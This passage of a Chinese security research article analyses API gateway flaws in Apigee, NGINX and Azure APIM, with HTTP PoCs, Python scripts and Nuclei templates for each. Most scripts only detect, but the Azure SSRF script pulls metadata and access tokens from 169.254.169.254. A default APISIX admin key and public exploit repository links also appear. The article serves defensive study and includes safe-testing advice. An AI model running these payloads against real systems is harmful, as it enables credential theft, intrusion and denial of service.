| Apigee Hybrid < 1.11.2 | 受影响 |
| Apigee Hybrid < 1.12.4 | 受影响 |
| Apigee Hybrid < 1.13.3 | 受影响 |
| Apigee Hybrid < 1.14.1 | 受影响 |
| Apigee Hybrid 1.11.2+ / 1.12.4+ / 1.13.3+ / 1.14.1+ | 已修复 |

**漏洞原理分析**

Apigee 的 JavaCallout 策略允许开发者在 API 代理流程中嵌入自定义 Java 代码。正常情况下，JavaCallout 在沙箱环境中运行，对 MessageContext 对象的访问受到限制。然而，漏洞在于 JavaCallout 策略在处理 MessageContext 时未能正确实施沙箱隔离。

攻击者可以通过编写恶意 Java 代码，利用 MessageContext 注入恶意对象来逃逸沙箱限制，执行任意 Java 代码和系统命令。利用步骤如下：

1. 攻击者需要具有 Apigee API 代理的部署权限（可通过管理界面或 API）
2. 编写包含恶意 JavaCallout 策略的 API 代理包
3. 通过 `bundle deploy` 命令或管理 API 上传代理包
4. Apigee 运行时执行 JavaCallout 时，恶意代码通过 MessageContext 获取 Runtime 上下文
5. 通过 `Runtime.getenv()` 等方法获取环境变量（包含数据库凭据等敏感信息）
6. 通过 `Runtime.exec()` 执行系统命令

**HTTP PoC**

```http
POST /v1/organizations/myorg/apis/deployments HTTP/1.1
Host: api.apigee.googleapis.com
Authorization: Bearer <access_token>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="malicious-bundle.zip"
Content-Type: application/zip

<binary proxy bundle with malicious JavaCallout>
------WebKitFormBoundary--
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2025-13426 Google Apigee JavaCallout RCE Detection (Non-destructive)"""
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_java_callout_available(target, token=None):
    base_url = target.rstrip("/")
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    check_paths = [
        "/v1/organizations",
        "/v1/o",
        "/v1/organizations/myorg/apis",
    ]

    findings = []
    for path in check_paths:
        try:
            resp = requests.get(
                f"{base_url}{path}",
                headers=headers,
                timeout=10,
                verify=False,
            )
            if resp.status_code in (200, 403, 401):
                findings.append({
                    "path": path,
                    "status": resp.status_code,
                    "hint": "Apigee Management API accessible" if resp.status_code == 200 else "Requires auth",
                })
        except requests.RequestException:
            continue

    return findings


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <apigee_mgmt_endpoint> [token]")
        sys.exit(1)
    token = sys.argv[2] if len(sys.argv) > 2 else None
    results = check_java_callout_available(sys.argv[1], token)
    if results:
        print(f"[+] Apigee Management API endpoints found:")
        for r in results:
            print(f"    {r['path']} -> {r['status']} ({r['hint']})")
        print("[*] CVE-2025-13426: If JavaCallout deploys succeed, RCE may be possible")
    else:
        print("[-] No Apigee Management API endpoints accessible")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2025-13426

info:
  name: Google Apigee Hybrid JavaCallout RCE
  author: x7peeps
  severity: high
  description: |
    Apigee Hybrid JavaCallout policy allows sandbox escape via MessageContext
    injection, enabling arbitrary Java code execution by users with API proxy
    deployment permissions.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-13426
    - https://cloud.google.com/apigee/docs/release-notes
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.7
    cve-id: CVE-2025-13426
    cwe-id: CWE-913
  tags: cve,cve2025,apigee,rce,java

http:
  - method: GET
    path:
      - "{{BaseURL}}/v1/organizations"

    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 403
          - 401
```

### 0x04.2 CVE-2025-13292 — GatewayToHeaven 跨租户数据访问

**漏洞背景**

CVE-2025-13292 是 Google Apigee-X 中的跨租户数据访问漏洞，CVSS v4 评分 7.6（HIGH），由安全研究员 Omer Yoachimik（omeramiad.com）和 Focal Security（focalsecurity.io）发现并命名为"GatewayToHeaven"。该漏洞影响 Apigee-X < 1-16-0-apigee-3 版本，Google 在漏洞被实际利用前已完成修复。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| Apigee-X < 1-16-0-apigee-3 | 受影响 |
| Apigee-X ≥ 1-16-0-apigee-3 | 已修复（自动） |

**漏洞原理分析**

这是一个多阶段的权限提升和跨租户数据访问漏洞链，攻击路径如下：

1. **初始访问**：攻击者获取 GCP 租户项目中的 Apigee 服务账户凭据
2. **权限提升**：利用 Dataflow 服务账户的过宽 IAM 权限，提升至更高权限
3. **跨租户访问**：利用提升后的权限访问跨租户的 Google Cloud Storage（GCS）存储桶
4. **数据泄露**：GCS 存储桶中包含 Apigee 分析数据和访问日志，日志中包含明文终端用户访问令牌和 IP 地址

该漏洞最严重的影响在于：攻击者通过访问 Apigee 访问日志中记录的明文令牌，可以冒充任何使用 Apigee 的组织的终端用户。这意味着一个租户的漏洞可以影响到所有使用 Google Apigee 的企业客户。

**HTTP PoC**

```http
GET /storage/v1/b/tenant-analytics-bucket/o?maxResults=100 HTTP/1.1
Host: storage.googleapis.com
Authorization: Bearer <escalated_service_account_token>
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2025-13292 Apigee-X GatewayToHeaven Access Pattern Detection"""
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_gcs_access(token):
    headers = {"Authorization": f"Bearer {token}"}
    gcs_api = "https://storage.googleapis.com/storage/v1"

    try:
        resp = requests.get(
            f"{gcs_api}/b",
            headers=headers,
            timeout=10,
            verify=False,
        )
        if resp.status_code == 200:
            data = resp.json()
            buckets = data.get("items", [])
            suspicious = [
                b for b in buckets
                if any(kw in b.get("id", "").lower() for kw in ["apigee", "analytics", "access-log", "gateway"])
            ]
            return True, suspicious
        return False, []
    except requests.RequestException:
        return False, []


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <gcp_service_account_token>")
        sys.exit(1)
    vuln, buckets = check_gcs_access(sys.argv[1])
    if vuln:
        print(f"[+] CVE-2025-13292: GCS access confirmed")
        if buckets:
            print(f"    Found {len(buckets)} suspicious Apigee-related buckets:")
            for b in buckets[:10]:
                print(f"    - {b.get('id')}")
        else:
            print("    No suspicious buckets found (check manually)")
    else:
        print("[-] GCS access denied or not exploitable")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2025-13292

info:
  name: Google Apigee-X GatewayToHeaven Cross-Tenant Data Access
  author: x7peeps
  severity: high
  description: |
    Apigee-X allows cross-tenant data access via GCP service account
    privilege escalation through Dataflow, exposing plaintext access
    tokens in analytics logs.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-13292
    - https://omeramiad.com/
    - https://focalsecurity.io/
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N
    cvss-score: 7.6
    cve-id: CVE-2025-13292
    cwe-id: CWE-269
  tags: cve,cve2025,apigee,gcp,cross-tenant,data-exfiltration

http:
  - method: GET
    path:
      - "https://storage.googleapis.com/storage/v1/b?maxResults=100"

    headers:
      Authorization: "Bearer {{token}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "apigee"
          - "analytics"
        condition: or

      - type: status
        status:
          - 200
```

---

## 0x05 F5 NGINX 高危漏洞

NGINX 是全球使用最广泛的 Web 服务器和反向代理之一，其 HTTP/2、HTTP/3 和 gRPC 支持使其成为 API 网关的核心组件。F5 Networks 在收购 NGINX 后持续维护和增强其功能，但新引入的协议支持也带来了新的攻击面。

### 0x05.1 CVE-2023-44487 — HTTP/2 Rapid Reset 协议级 DDoS

**漏洞背景**

CVE-2023-44487 是 2023 年影响最广泛的 API 网关安全事件之一，CVSS 3.1 评分 7.5（HIGH）。该漏洞影响所有支持 HTTP/2 的 API 网关和 Web 服务器，包括 Kong、APISIX、NGINX、Envoy 等。2023 年 8-10 月期间，该漏洞被大规模利用，Google Cloud 曾抵御峰值 3.98 亿 RPS 的攻击。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| 所有支持 HTTP/2 的服务器（nghttp2 < 1.57.0 等） | 受影响 |
| 各厂商已分别修复 | 已修复 |

**漏洞原理分析**

HTTP/2 协议允许客户端在单个 TCP 连接上并发发送多个请求流（stream）。每个流可以独立传输数据帧，并且客户端可以随时发送 `RST_STREAM` 帧来取消一个流。

HTTP/2 Rapid Reset 攻击利用了以下协议特性：

1. 客户端发送一个请求头帧（HEADERS frame）
2. 客户端立即发送 RST_STREAM 帧取消该请求
3. 服务端收到 HEADERS 后需要分配资源来处理该流
4. 服务端收到 RST_STREAM 后需要释放该流的资源
5. 攻击者以极高频率重复步骤 1-4

关键问题在于，服务端在步骤 2 分配资源的速度可能低于步骤 4 释放资源的速度，但分配资源的开销（内存分配、上下文切换、并发锁竞争）远大于释放资源。更重要的是，许多 HTTP/2 实现在取消流时并没有立即释放所有相关资源，而是延迟释放或在后台处理。

攻击者通过在单个 TCP 连接上快速创建和取消大量流，可以在极短时间内消耗服务器的大量 CPU 和内存资源。由于所有操作都在单个 TCP 连接上完成，传统的基于连接数的限流机制完全无效。

2023 年 10 月的大规模攻击中，攻击者利用这一漏洞在多个云平台上发起了创纪录的 DDoS 攻击。Google Cloud 报告了峰值 3.98 亿 RPS 的攻击，Cloudflare 和 AWS 也报告了类似规模的攻击事件。

**HTTP PoC**

```http
HEADERS + END_STREAM
Stream 1: GET / HTTP/2.0
:authority: target.com

RST_STREAM
Stream 1: CANCEL

HEADERS + END_STREAM
Stream 3: GET / HTTP/2.0
:authority: target.com

RST_STREAM
Stream 3: CANCEL
...（高速重复）
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2023-44487 HTTP/2 Rapid Reset DoS Detection (Safe - Low Rate)"""
import requests
import sys
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_http2_support(target):
    try:
        resp = requests.get(
            target,
            timeout=10,
            verify=False,
            headers={"User-Agent": "CVE-2023-44487 Detector/1.0"},
        )
        http_version = resp.raw.version
        if http_version == 20:
            return True, "HTTP/2 supported"
        return False, f"HTTP version: {resp.raw.version}"
    except requests.RequestException as e:
        return False, str(e)


def safe_rapid_reset_test(target, num_requests=50, delay=0.01):
    import http.client
    import ssl

    from urllib.parse import urlparse

    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        if port == 443:
            conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=10)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=10)

        start = time.time()
        for i in range(num_requests):
            try:
                conn.request("GET", "/", headers={
                    "Host": host,
                    "Connection": "keep-alive",
                })
                resp = conn.getresponse()
                resp.read()
            except Exception:
                pass
            time.sleep(delay)

        elapsed = time.time() - start
        return elapsed
    except Exception:
        return None


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    supported, info = check_http2_support(target)
    print(f"[*] {target}: {info}")
    if supported:
        print("[*] HTTP/2 is supported - potentially vulnerable to CVE-2023-44487")
        print("[*] Running safe low-rate test...")
        elapsed = safe_rapid_reset_test(target)
        if elapsed:
            print(f"[*] Test completed in {elapsed:.2f}s")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2023-44487

info:
  name: HTTP/2 Rapid Reset DDoS
  author: x7peeps
  severity: high
  description: |
    HTTP/2 Rapid Reset attack exploits the protocol's ability to rapidly
    create and cancel streams, causing resource exhaustion on servers
    that support HTTP/2.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-44487
    - https://cloud.google.com/blog/products/identity-security/throttling-http-2-based-ddos-attacks
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2023-44487
    cwe-id: CWE-400
  tags: cve,cve2023,http2,ddos,protocol

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      User-Agent: "CVE-2023-44487 Detector/1.0"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "h2"
          - "HTTP/2"
        condition: or

      - type: status
        status:
          - 200
          - 403
```

### 0x05.2 CVE-2026-42530 — HTTP/3 模块 Use-After-Free RCE/DoS

**漏洞背景**

CVE-2026-42530 是 NGINX HTTP/3 QUIC 模块中的 Use-After-Free 漏洞，CVSS v3.1 评分 8.1（HIGH），CVSS v4 评分 9.2（Critical）。该漏洞影响 NGINX Open Source 1.31.0~1.31.1，是 NGINX 首次在 HTTP/3/QUIC 协议栈中发现的高危内存安全漏洞。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| NGINX Open Source 1.31.0 ~ 1.31.1（启用 HTTP/3 QUIC） | 受影响 |
| NGINX Open Source 1.31.2+ | 已修复 |

**漏洞原理分析**

该漏洞存在于 NGINX 的 QPACK（HTTP/3 头部压缩）流处理逻辑中。当攻击者发送特制的 HTTP/3 流量并触发 QPACK 编码流的重新打开时，NGINX 工作进程在处理过程中会引用已经释放的内存区域。

QPACK 是 HTTP/3 用于头部压缩的协议，类似于 HTTP/2 的 HPACK。它使用一个动态表（dynamic table）来存储最近使用过的头部字段。当 QPACK 编码流被异常关闭后重新打开，NGINX 的内存管理逻辑存在缺陷，导致对已释放内存的引用（Use-After-Free）。

在 ASLR（地址空间布局随机化）禁用或部分禁用的环境中，攻击者可以利用此漏洞进行精确的内存布局控制，实现任意代码执行（RCE）。在 ASLR 启用的环境中，该漏洞至少会导致工作进程崩溃，造成拒绝服务（DoS）。

**HTTP PoC**

```http
# 需要使用 HTTP/3 QUIC 协议发送特制流量
# 使用 curl --http3 或专用工具
curl --http3 https://target.com/ -d "QPACK_encoded_malicious_headers"
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2026-42530 NGINX HTTP/3 QUIC UAF Detection (Non-destructive)"""
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_http3_support(target):
    try:
        resp = requests.get(
            target,
            timeout=10,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0"},
        )
        alt_svc = resp.headers.get("Alt-Svc", "")
        server = resp.headers.get("Server", "")

        http3_supported = "h3" in alt_svc.lower() or "quic" in alt_svc.lower()
        return http3_supported, {
            "Alt-Svc": alt_svc,
            "Server": server,
            "status": resp.status_code,
        }
    except requests.RequestException as e:
        return False, {"error": str(e)}


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    supported, info = check_http3_support(sys.argv[1])
    if supported:
        print(f"[+] HTTP/3 QUIC supported - potentially affected by CVE-2026-42530")
        for k, v in info.items():
            print(f"    {k}: {v}")
    else:
        print(f"[-] HTTP/3 not detected: {info}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2026-42530

info:
  name: NGINX HTTP/3 QUIC Use-After-Free RCE/DoS
  author: x7peeps
  severity: high
  description: |
    NGINX HTTP/3 QUIC module contains a Use-After-Free in QPACK stream
    handling, allowing RCE (ASLR disabled) or DoS via crafted HTTP/3 traffic.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-42530
    - https://nginx.org/en/security_advisories.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2026-42530
    cwe-id: CWE-416
  tags: cve,cve2026,nginx,http3,quic,uaf,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      User-Agent: "Mozilla/5.0"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "h3"
          - "quic"
        condition: or

      - type: word
        part: header
        words:
          - "nginx"
```

### 0x05.3 CVE-2026-42055 — gRPC 代理模块堆缓冲区溢出 RCE/DoS

**漏洞背景**

CVE-2026-42055 是 NGINX 在 HTTP/2 后端代理和 gRPC 上游模块中的堆缓冲区溢出漏洞，CVSS v4 评分 9.2（Critical）。该漏洞影响 NGINX Plus R33~R36 和 NGINX Open Source 1.30.0~1.31.1，以及 NGINX App Protect WAF。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| NGINX Plus R33 ~ R36 | 受影响 |
| NGINX Open Source 1.30.0 ~ 1.31.1 | 受影响 |
| NGINX Plus R36 P6; Open Source 1.30.3/1.31.2+ | 已修复 |

**漏洞原理分析**

该漏洞在配置 `proxy_http_version 2` 使用 HTTP/2 后端代理或启用 gRPC 上游时触发。当 NGINX 作为反向代理接收并转发 HTTP/2 或 gRPC 流量时，对畸形数据帧的处理存在堆缓冲区溢出缺陷。

具体而言，当攻击者发送特制的 HTTP/2 DATA 帧或 gRPC 消息流时，NGINX 在解码和缓冲区管理过程中未能正确验证数据大小和偏移量，导致超出分配的堆缓冲区边界写入数据。这种堆缓冲区溢出可以导致：

- **DoS**：工作进程崩溃，服务中断
- **RCE**：通过精心构造的堆布局，攻击者可覆写函数指针或虚表指针，实现任意代码执行

在启用了 NGINX App Protect WAF 的环境中，该漏洞的影响更大，因为 WAF 模块通常以较高权限运行。

**HTTP PoC**

```http
POST /grpc-service HTTP/2.0
Host: target.com
Content-Type: application/grpc
:method: POST

<畸形 gRPC DATA 帧 payload>
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2026-42055 NGINX gRPC Heap Buffer Overflow Detection (Non-destructive)"""
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_grpc_support(target):
    try:
        resp = requests.options(
            target,
            timeout=10,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0"},
        )
        allow = resp.headers.get("Allow", "")
        te = resp.headers.get("TE", "")
        server = resp.headers.get("Server", "")

        grpc_indicators = ["grpc" in allow.lower(), "grpc" in te.lower(), "trailers" in te.lower()]
        nginx_indicators = ["nginx" in server.lower()]

        return any(grpc_indicators), any(nginx_indicators), {
            "Server": server,
            "Allow": allow,
            "TE": te,
            "status": resp.status_code,
        }
    except requests.RequestException as e:
        return False, False, {"error": str(e)}


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    grpc_ok, nginx_ok, info = check_grpc_support(sys.argv[1])
    if grpc_ok and nginx_ok:
        print("[+] CVE-2026-42055: NGINX gRPC proxy detected - potentially vulnerable")
        for k, v in info.items():
            print(f"    {k}: {v}")
    elif nginx_ok:
        print("[*] NGINX detected but gRPC not confirmed")
    else:
        print(f"[-] Not applicable: {info}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2026-42055

info:
  name: NGINX gRPC/HTTP2 Proxy Heap Buffer Overflow
  author: x7peeps
  severity: high
  description: |
    NGINX HTTP/2 backend proxy and gRPC upstream modules contain a heap
    buffer overflow triggered by malformed HTTP/2 or gRPC streams.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-42055
    - https://nginx.org/en/security_advisories.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2026-42055
    cwe-id: CWE-122
  tags: cve,cve2026,nginx,grpc,h2,heap-overflow,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      User-Agent: "Mozilla/5.0"

    matchers:
      - type: word
        part: header
        words:
          - "nginx"
```

---

## 0x06 Azure API Management 漏洞集群

Azure API Management（APIM）是 Microsoft Azure 平台上的全托管 API 网关和管理服务，被大量企业用于 API 发布、安全防护和流量管理。2022 年底，安全研究人员 Tenable、Orca 和 Binary Security 分别独立发现了 APIM 中的多个高危漏洞，形成了一个影响深远的漏洞集群。微软在报告后已修复所有已知问题。

### 0x06.1 CORS Proxy SSRF

**漏洞原理分析**

Azure APIM 提供了一个内置的 CORS Proxy 功能，允许开发者通过 APIM 代理转发跨域请求。该 Proxy 在处理用户提供的目标 URL 时，未对目标地址进行严格的白名单验证和内网地址过滤。

攻击者可以通过 CORS Proxy 访问 Azure 内部服务，包括：

- **IMDS（Instance Metadata Service）**：`http://169.254.169.254/metadata/instance` 可获取 VM 的托管身份凭据
- **内部 API 端点**：访问仅在 VNet 内部可达的服务
- **其他租户资源**：通过构造特殊的 URL 绕过租户隔离

**HTTP PoC**

```http
GET /proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1
Host: target-apim.azure-api.net
Metadata: true
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""Azure APIM CORS Proxy SSRF Detection"""
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_ssrf(target):
    base_url = target.rstrip("/")
    payloads = [
        "/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "/proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "/cors?url=http://169.254.169.254/metadata/instance",
    ]

    for payload in payloads:
        try:
            resp = requests.get(
                f"{base_url}{payload}",
                timeout=10,
                verify=False,
                headers={"Metadata": "true"},
            )
            if resp.status_code == 200:
                body = resp.text
                if "vmName" in body or "subscriptionId" in body or "access_token" in body:
                    return True, payload, resp.text[:300]
        except requests.RequestException:
            continue

    return False, None, None


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <apim_endpoint>")
        sys.exit(1)
    vuln, path, preview = check_ssrf(sys.argv[1])
    if vuln:
        print(f"[+] Azure APIM SSRF Vulnerable!")
        print(f"    Endpoint: {path}")
        print(f"    Preview: {preview}")
    else:
        print("[-] Not Vulnerable or proxy not exposed")
```

**Nuclei YAML 检测模板**

```yaml
id: azure-apim-ssrf

info:
  name: Azure API Management CORS Proxy SSRF
  author: x7peeps
  severity: high
  description: |
    Azure APIM CORS/Hosting Proxy can be abused to access internal
    metadata endpoints and internal services via SSRF.
  reference:
    - https://www.tenable.com/blog/azure-api-management-vulnerabilities
  classification:
    cvss-score: 8.6
    cwe-id: CWE-918
  tags: azure,apim,ssrf,metadata

http:
  - method: GET
    path:
      - "{{BaseURL}}/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

    headers:
      Metadata: "true"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "vmName"
          - "subscriptionId"
          - "resourceGroupName"
        condition: or

      - type: status
        status:
          - 200
```

### 0x06.2 Hosting Proxy SSRF

**漏洞原理分析**

APIM 的 Hosting Proxy 功能允许通过 APIM 域名托管静态内容。该功能在处理路径请求时，会将用户指定的路径作为后端 URL 进行请求。攻击者可以通过构造特殊路径访问 Azure 内部网络服务，与 CORS Proxy SSRF 类似但利用不同的 URL 路径模式。

### 0x06.3 遗留 API 权限提升

**漏洞原理分析**

Azure APIM 的管理 API 存在权限模型缺陷：拥有 Reader 角色（最低权限之一）的用户可以通过特定的 API 调用获取 APIM 管理 API 的完整 SSO 令牌。该令牌赋予用户对 APIM 服务的完全控制权，包括：

- 创建和删除 API
- 修改策略配置（可插入恶意策略实现 RCE）
- 访问所有 API 密钥和证书
- 修改后端服务配置

这个权限提升链为：**Reader 角色 → SSO 令牌获取 → APIM 完全控制 → 后端服务渗透**。

**HTTP PoC**

```http
POST /subscriptions/{sub-id}/resourceGroups/{rg}/providers/Microsoft.ApiManagement/service/{service}/listSecrets?api-version=2021-08-01 HTTP/1.1
Host: management.azure.com
Authorization: Bearer <reader_role_token>
```

---

## 0x07 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE | PoC 可用性 | PoC 类型 | 来源 |
|---|---|---|---|
| CVE-2022-24112 | ✅ | GitHub 仓库 + Metasploit | M4xSec/Apache-APISIX-CVE-2022-24112 |
| CVE-2021-45232 | ✅ | 技术博客分析 | Vicarius Blog |
| CVE-2022-29266 | ✅ | Apache 官方博客 | apisix.apache.org |
| CVE-2024-32638 | ✅ | Apache 官方博客 | apisix.apache.org |
| CVE-2021-27306 | ✅ | 原始研究报告 | 漏洞赏金报告 |
| CVE-2023-42283 | ✅ | GitHub 仓库 + Snyk | andreysanyuk/CVE-2023-42283 |
| CVE-2025-13426 | ❌ | 无公开 PoC | — |
| CVE-2025-13292 | ✅ | 详细技术分析 | omeramiad.com / focalsecurity.io |
| CVE-2023-44487 | ✅ | 多个 PoC | 业界广泛公开 |
| CVE-2026-42530 | ❌ | 无公开 PoC | — |
| CVE-2026-42055 | ❌ | 无公开 PoC | — |
| Azure APIM | ✅ | 安全研究报告 | Tenable / Orca / Binary Security |

### 关键 PoC 仓库链接

| 资源 | 链接 |
|---|---|
| APISIX CVE-2022-24112 PoC | `https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112` |
| Tyk CVE-2023-42283 PoC | `https://github.com/andreysanyuk/CVE-2023-42283` |
| APISIX 安全公告 | `https://apisix.apache.org/blog/` |
| Apigee-X GatewayToHeaven | `https://omeramiad.com/` / `https://focalsecurity.io/` |
| Azure APIM 漏洞分析 | Tenable Research Blog |
| NGINX 安全公告 | `https://nginx.org/en/security_advisories.html` |

### 防守型验证思路

在进行安全验证时，应遵循以下原则：

1. **仅在授权范围内测试**：确保拥有书面渗透测试授权
2. **使用非破坏性方法**：优先使用信息泄露类 PoC，避免执行 RCE 和 DoS
3. **控制影响范围**：在测试环境中验证，避免影响生产环境
4. **记录所有操作**：保留完整的测试日志和时间戳
5. **及时清理**：测试完成后删除所有创建的路由、账户和文件

对于本专题覆盖的漏洞，推荐的验证优先级为：

- **第一优先级**：信息泄露类（CVE-2022-29266 密钥泄露、CVE-2021-45232 未授权访问）— 风险最低、验证最直接
- **第二优先级**：认证绕过类（CVE-2021-27306 路径穿越、CVE-2022-24112 IP 绕过）— 需确认不影响服务
- **第三优先级**：协议级漏洞（CVE-2023-44487、CVE-2024-32638）— 仅做检测不做利用
- **禁止主动利用**：RCE 类漏洞（CVE-2022-24112 完整利用、CVE-2025-13426、CVE-2026-42530）— 仅做版本检测和配置审计

---

## 0x08 共性攻击模式分析

对本专题覆盖的 12 个 CVE/漏洞集群进行横向对比，可以归纳出五种共性攻击模式。理解这些模式有助于安全团队在评估新型 API 网关时建立系统化的安全审查框架。

### 模式 1：默认配置滥用

| 漏洞 | 默认配置问题 | 攻击效果 |
|---|---|---|
| CVE-2022-24112 | 默认 Admin Key `edd1c9f034335f136f87ad84b625c8f1` | 结合 IP 绕过直接 RCE |
| CVE-2021-45232 | Dashboard 默认端口 9000 无认证 | 未授权访问所有管理接口 |
| CVE-2023-42283 | 统计 API 端点默认开启 | 未授权 SQL 注入 |

**共性特征**：API 网关产品为了降低部署门槛，通常在默认配置中保留了开发和测试阶段的设置。这些默认值（硬编码密钥、未关闭的调试端点、宽松的访问控制）在生产环境中构成了严重的安全风险。

**防御建议**：在部署 API 网关时，必须执行安全基线检查清单（Security Baseline Checklist），包括但不限于：修改所有默认密钥和证书、关闭不必要的管理端口、配置 IP 白名单、启用 TLS 加密。

### 模式 2：插件/模块生态攻击面

| 漏洞 | 问题插件/模块 | 漏洞类型 |
|---|---|---|
| CVE-2022-24112 | batch-requests | 认证绕过 |
| CVE-2022-29266 | jwt-auth | 信息泄露 |
| CVE-2024-32638 | forward-auth | HTTP 请求走私 |
| CVE-2021-27306 | JWT 插件 | 路径穿越绕过 |
| CVE-2025-13426 | JavaCallout | RCE |

**共性特征**：API 网关的插件/扩展机制是其核心竞争力，但也是最大的攻击面。每个新插件都引入了新的代码路径和安全假设，而这些假设可能与网关的其他组件产生冲突。特别是认证类插件（jwt-auth、forward-auth）和请求处理类插件（batch-requests）的漏洞影响最为严重。

**防御建议**：对第三方插件进行安全审计，限制可用插件白名单，定期审查已安装插件的安全公告，禁用不必要的插件功能。

### 模式 3：协议级攻击

| 漏洞 | 攻击协议 | 攻击类型 |
|---|---|---|
| CVE-2023-44487 | HTTP/2 | Rapid Reset DoS |
| CVE-2026-42530 | HTTP/3 / QUIC | UAF RCE/DoS |
| CVE-2026-42055 | HTTP/2 / gRPC | 堆缓冲区溢出 |
| CVE-2024-32638 | HTTP/1.1 Transfer-Encoding | 请求走私 |

**共性特征**：HTTP 协议的演进（HTTP/1.1 → HTTP/2 → HTTP/3/gRPC）在带来性能提升的同时，也引入了新的解析复杂度和攻击面。API 网关作为协议转换层，需要同时理解多种协议版本和编码方式，任何解析不一致都可能被攻击者利用。

**防御建议**：在网关前部署协议感知的 DDoS 防护（如 Cloudflare、AWS Shield），限制单连接的最大并发流数和最大帧大小，对异常协议行为进行实时监控和告警。

### 模式 4：云托管服务信任边界绕过

| 漏洞 | 信任边界 | 攻击效果 |
|---|---|---|
| CVE-2025-13292 | GCP 租户隔离 | 跨租户数据访问 |
| Azure APIM 集群 | Azure IAM 角色 | SSRF + 权限提升 |
| CVE-2025-13426 | Apigee 沙箱 | Java 沙箱逃逸 |

**共性特征**：云托管的 API 网关服务（Apigee-X、Azure APIM）在多租户环境下运行，依赖平台级的 IAM、网络隔离和沙箱机制来保障安全。当这些平台级安全机制存在缺陷时，单个租户的漏洞可能影响到整个平台的所有客户。

**防御建议**：遵循最小权限原则（Principle of Least Privilege），定期审计 IAM 权限和角色绑定，启用云平台的安全监控和审计日志（如 Azure Defender、GCP Security Command Center），对跨租户数据流进行异常检测。

### 模式 5：遗留 API 版本管理风险

| 漏洞 | 遗留问题 | 攻击效果 |
|---|---|---|
| Azure APIM 遗留 API | 旧版管理 API 未下线 | Reader → 完全控制 |
